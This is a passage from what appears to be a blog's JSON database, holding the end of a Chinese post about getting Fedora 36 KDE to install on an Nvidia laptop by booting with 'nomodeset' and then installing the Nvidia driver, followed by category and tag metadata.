Fedora</p>\n<p>troubleshouting-----&gt;</p>\n</blockquote>\n<p>在第一个和第二个选项都已经尝试过后，我自然的进入第三个选项troubleshouting上了，出乎意料的，在troubleshouting后，我发现我进入了Fedora的安装界面，虽然分辨率堪忧，但是有了进展和区别，总是好的。</p>\n<p>于是我重新回到Grub界面，按e键分别查看前三个选项的启动命令行，分析差别。</p>\n<p>一个显而易见的差别映入我的眼帘，“nomodeset”参数，这个参数在troubleshouting中有，然而在前两个选项中没有，这会是troubleshouting能成功启动的原因吗？</p>\n<p>于是我在e键跟进了第一个选项，添加了nomedeset参数，ctrl+x键执行，成功进入安装界面，虽然依旧是分辨率堪忧。</p>\n<p>于是再次Google nomedeset的作用，发现是暂且不加载显卡模块。看见显卡二字，以及自己电脑上绿色的Nvidia商标，再联想到linus著名的f**k nvidia之喷，我大概确定了了，是显卡的问题。</p>\n<h2 id=\"解决问题\">解决问题</h2>\n<p>既然确定了是显卡的问题，那么转换搜索思路，以Nvidia为关键词再在ask fedora搜索，于是找到了<a href=\"https://ask.fedoraproject.org/t/kde-fails-to-boot-on-certain-nvidia-graphics-cards-in-uefi-mode/22065\">这个</a></p>\n<blockquote>\n<h2 id=\"Problem\">Problem</h2>\n<p>On systems with certain Nvidia graphics cards, Fedora 36 KDE fails to boot in UEFI mode. This includes both the Live installer image and the installed system.</p>\n<p>It only happens in combination with Wayland display protocol, but the KDE login screen it configured to use Wayland by default, so this happens every time, unless the settings are changed in the installed system.</p>\n<h2 id=\"Cause\">Cause</h2>\n<p>Not yet known. In general, Nvidia’s attitude towards Linux.</p>\n<h2 id=\"Related-Issues\">Related Issues</h2>\n<p>Bugzilla report: <a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2077359\">2077359 – KDE on X11 with native graphics hangs with Nvidia GPU and UEFI 53</a></p>\n<h2 id=\"Workarounds\">Workarounds</h2>\n<p>You have the following options:<br>\nA) Switch your system to BIOS mode instead of UEFI and install Fedora that way.<br>\nB) Boot the install in <em>Safe graphics mode</em> (available under the <em>Troubleshooting</em> boot menu). After system install, either install the closed-source nvidia driver (if you intended to do so), or set KDE to always use X11 instead of Wayland, including the login screen. Then edit the grub config files to remove the <em>nomodeset</em> keyword (triggering safe graphics mode) and rebuild the installed grub bootloader config.<br>\nC) Install Fedora Workstation (GNOME) instead of KDE.<br>\nD) Switch your graphics card to a more Linux-friendly vendor (AMD, Intel). You might already have an integrated graphics card in your CPU which you can use instead of the Nvidia external one.</p>\n</blockquote>\n<p>那么基本确定了解决思路：</p>\n<p>nomodeset先install fedora，然后进入fedora安装Nvidia显卡驱动，然后再重新启动。</p>\n<p>当然，在安装驱动过程中也遇到了一些问题，网络上对于驱动安装基本有三种主流的方法：</p>\n<ul>\n<li>在dnf添加两个源，用dnf安装</li>\n<li>用Nvidia官方的脚本安装</li>\n<li>在dnf添加一个module，用dnf安装(由于我是第一次使用red hat系的发行版，对dnf不是很熟，不是很能理解和第一个的区别)</li>\n</ul>\n<p>尝试了一下后，发现第一第二种都出现了一些莫名其妙的问题，最后在第三种方法下完美完成。</p>\n<h2 id=\"一些感想\">一些感想</h2>\n<p>//突然没灵感，待写</p>\n"}],"PostAsset":[],"PostCategory":[{"post_id":"cl6g6majb0009j8v08ptn3mbp","category_id":"cl6g6maj80004j8v0b46u367p","_id":"cl6g6majf000gj8v02993dzv4"},{"post_id":"cl6g6maj40001j8v09xio976v","category_id":"cl6g6maj80004j8v0b46u367p","_id":"cl6g6majh000lj8v0dgiv36z4"},{"post_id":"cl6g6majd000ej8v0gav9b7cl","category_id":"cl6g6maj80004j8v0b46u367p","_id":"cl6g6majh000oj8v046gv5q3i"},{"post_id":"cl6g6maj70003j8v00j19d090","category_id":"cl6g6maj80004j8v0b46u367p","_id":"cl6g6majj000tj8v0hq5ne6rz"},{"post_id":"cl6g6maje000fj8v0fqrpert5","category_id":"cl6g6maj80004j8v0b46u367p","_id":"cl6g6majk000wj8v0chkpcyvt"},{"post_id":"cl6g6majf000kj8v0gvh79n7c","category_id":"cl6g6maj80004j8v0b46u367p","_id":"cl6g6majl0010j8v03yjz8owb"},{"post_id":"cl6g6maj90007j8v045soc4vw","category_id":"cl6g6maj80004j8v0b46u367p","_id":"cl6g6majl0012j8v08ug3ft4u"},{"post_id":"cl6g6majc000bj8v04as2g69h","category_id":"cl6g6maji000pj8v0cawyd7ba","_id":"cl6g6majl0016j8v02qhbear7"},{"post_id":"cl6g6majh000nj8v0hyr784hl","category_id":"cl6g6majk000xj8v0afko4q4d","_id":"cl6g6majm001aj8v03s9yfans"},{"post_id":"cl6g6maji000sj8v071mi7znu","category_id":"cl6g6majk000xj8v0afko4q4d","_id":"cl6g6majn001ej8v07l7g4swx"},{"post_id":"cl6g6majj000vj8v0dyz5bnbo","category_id":"cl6g6majk000xj8v0afko4q4d","_id":"cl6g6majn001hj8v01cda8fgu"},{"post_id":"cl6xkro2s0000h0v0cg8oh918","category_id":"cl6g6maji000pj8v0cawyd7ba","_id":"cl6xkro2w0002h0v01wkxb0at"},{"post_id":"cl996gnps00001wv07mywatz3","category_id":"cl996gnq100011wv0cfepb6dn","_id":"cl996gnq600041wv0at5a7vpm"}],"PostTag":[{"post_id":"cl6g6majd000ej8v0gav9b7cl","tag_id":"cl6g6maj90005j8v08vbz2vxr","_id":"cl6g6majf000jj8v0f9hffw30"},{"post_id":"cl6g6majd000ej8v0gav9b7cl","tag_id":"cl6g6majc000dj8v01bsh52ny","_id":"cl6g6majh000mj8v019gm0psa"},{"post_id":"cl6g6maj40001j8v09xio976v","tag_id":"cl6g6maj90005j8v08vbz2vxr","_id":"cl6g6maji000rj8v0fhsa9jto"},{"post_id":"cl6g6maj40001j8v09xio976v","tag_id":"cl6g6majc000dj8v01bsh52ny","_id":"cl6g6majj000uj8v048lmfyqu"},{"post_id":"cl6g6maje000fj8v0fqrpert5","tag_id":"cl6g6maj90005j8v08vbz2vxr","_id":"cl6g6majk000zj8v0ganvh58n"},{"post_id":"cl6g6maje000fj8v0fqrpert5","tag_id":"cl6g6majc000dj8v01bsh52ny","_id":"cl6g6majl0011j8v00myaban7"},{"post_id":"cl6g6majf000kj8v0gvh79n7c","tag_id":"cl6g6maj90005j8v08vbz2vxr","_id":"cl6g6majl0015j8v01k5oc1ao"},{"post_id":"cl6g6majf000kj8v0gvh79n7c","tag_id":"cl6g6majc000dj8v01bsh52ny","_id":"cl6g6majl0017j8v0cj6n2tv1"},{"post_id":"cl6g6maj70003j8v00j19d090","tag_id":"cl6g6maj90005j8v08vbz2vxr","_id":"cl6g6majm001bj8v0331qap5o"},{"post_id":"cl6g6maj70003j8v00j19d090","tag_id":"cl6g6majc000dj8v01bsh52ny","_id":"cl6g6majm001cj8v0fpu65h9s"},{"post_id":"cl6g6maj90007j8v045soc4vw","tag_id":"cl6g6maj90005j8v08vbz2vxr","_id":"cl6g6majn001fj8v08t6r804d"},{"post_id":"cl6g6maj90007j8v045soc4vw","tag_id":"cl6g6majc000dj8v01bsh52ny","_id":"cl6g6majn001gj8v09wyady94"},{"post_id":"cl6g6majb0009j8v08ptn3mbp","tag_id":"cl6g6maj90005j8v08vbz2vxr","_id":"cl6g6majn001jj8v0ccyj4qsx"},{"post_id":"cl6g6majb0009j8v08ptn3mbp","tag_id":"cl6g6majc000dj8v01bsh52ny","_id":"cl6g6majo001kj8v04i2eez2o"},{"post_id":"cl6g6majc000bj8v04as2g69h","tag_id":"cl6g6maj90005j8v08vbz2vxr","_id":"cl6g6majo001lj8v00jhf9ywu"},{"post_id":"cl6g6majc000bj8v04as2g69h","tag_id":"cl6g6majm001dj8v0cuntdcv6","_id":"cl6g6majo001nj8v0446o9jqh"},{"post_id":"cl6g6majh000nj8v0hyr784hl","tag_id":"cl6g6majn001ij8v0ajiq5d5s","_id":"cl6g6majo001oj8v09too85h9"},{"post_id":"cl6g6maji000sj8v071mi7znu","tag_id":"cl6g6majn001ij8v0ajiq5d5s","_id":"cl6g6majo001qj8v0e1iz4rhi"},{"post_id":"cl6g6majj000vj8v0dyz5bnbo","tag_id":"cl6g6majn001ij8v0ajiq5d5s","_id":"cl6g6majp001rj8v0hfpihcb4"},{"post_id":"cl6xkro2s0000h0v0cg8oh918","tag_id":"cl6g6majm001dj8v0cuntdcv6","_id":"cl6xkro2w0001h0v0fyu19syv"},{"post_id":"cl996gnps00001wv07mywatz3","tag_id":"cl996gnq500021wv093tdcim9","_id":"cl996gnq500031wv07iq21iar"}],"Tag":[{"name":"Pwn","_id":"cl6g6maj90005j8v08vbz2vxr"},{"name":"CTF","_id":"cl6g6majc000dj8v01bsh52ny"},{"name":"Fuzz","_id":"cl6g6majm001dj8v0cuntdcv6"},{"name":"信息素养","_id":"cl6g6majn001ij8v0ajiq5d5s"},{"name":"Linux","_id":"cl996gnq500021wv093tdcim9"}]}}